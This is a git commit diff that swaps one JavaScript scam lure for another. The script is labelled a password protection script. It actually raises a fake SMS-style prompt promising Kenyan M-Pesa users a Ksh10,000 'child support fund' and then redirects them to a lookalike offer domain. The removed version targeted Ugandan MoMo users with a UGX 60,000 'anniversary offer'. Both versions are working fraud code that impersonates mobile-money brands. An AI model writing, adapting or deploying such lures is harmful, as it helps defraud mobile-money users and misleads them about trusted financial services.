e29a23f60192541bffebcec93a4a8d43de6fc068
kenycruzk <kenycruzk@gmail.com>
2025-05-31 00:26:42 +0100

    Update and rename offer.js to offe.js

---
+++ offe.js
@@ -0,0 +1,6 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'Ksh10,000'
+password=prompt('SMS: Congratulations You are Eligible to receive Ksh10,000 MPESA CHILD SUPPORT FUND, Kindly Press OK to PROCEED ','Ksh10,000');
+if (password != 'Ksh10,000') {
+location.href='https://mpesa-foundation.alloffer.pro/offer';
+}
--- offer.js
+++
@@ -1,6 +0,0 @@
-/* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'UGX 60,000'
-password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive UGX 60,000 MoMo Anniversary Offer, Kindly Press OK to PROCEED ','UGX 60,000');
-if (password != 'UGX 60,000') {
-location.href='https://momo-ug.alloffer.pro/gift';
-}
